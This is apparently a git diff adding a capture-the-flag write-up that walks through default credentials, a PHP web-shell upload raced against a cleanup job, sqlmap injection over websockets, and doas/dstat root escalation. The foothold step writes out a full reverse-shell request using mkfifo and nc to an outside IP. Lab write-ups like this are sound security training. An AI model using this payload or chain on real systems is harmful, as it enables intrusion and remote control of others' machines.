@@ -134,3 +134,78 @@ Progress: 26570 / 26585 (99.94%)
 ===============================================================
 
 ```
+- Web Server
+
+![](./images/1.png)
+
+## Foothold
+- Let's try default credentials since we know the application running
+
+![](./images/2.png)
+![](./images/3.png)
+
+- Let's try uploading file with `php` extension to get `rce`
+
+![](./images/4.png)
+![](./images/5.png)
+
+- It seems like there is a cleanup job, that deletes/moves the uploaded files
+
+![](./images/6.png)
+
+- Thus, I tried adding `web shell` to existing files
+  - But had no success, because the changes were reverted back
+
+![](./images/7.png)
+
+- So now we have a approximately 1 minute window to upload and get our `reverse shell` before our file gets deleted
+  - Prepared payload request beforehand: `GET /tiny/uploads/shell.php?cmd=rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.37+6666+>/tmp/f`
+  - Upload `php` file and send our request
+  - And we get our foothold
+
+![](./images/8.png)
+![](./images/9.png)
+
+
+## User
+- Now let's enumerate
+  - Let's use `linpeas`
+  - Nothing interesting was found, except another `vhost`
+  - Let's add it to our `/etc/hosts` and open it
+
+![](./images/10.png)
+
+- Let's check it
+  - We see that there are `websockets` involved in ticket input form
+  - So I played around with few basic `sqli`, but no success
+
+![](./images/11.png)
+![](./images/12.png)
+
+- I can try using `sqlmap` but have no idea how to send requests to `websocket`
+  - Luckily there is a great [blog](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) about it
+  - Thanks to [rayhan0x01](https://rayhan0x01.github.io)
+    - Check his blog out
+
+![](./images/13.png)
+
+- Now we can use `sqlmap`
+
+![](./images/14.png)
+
+- Use the creds dumped by `sqlmap` and we have our user
+
+## Root
+- If you ran `linpeas` before, you probably saw `doas` binary
+  - If search for it's config, you will find that it has permissions for `player` to run `dstat` as root
+
+![](./images/15.png)
+![](./images/19.png)
+
+
+- Check `GTFOBins`
+  - And get your root
+
+![](./images/16.png)
+![](./images/17.png)
+![](./images/18.png)
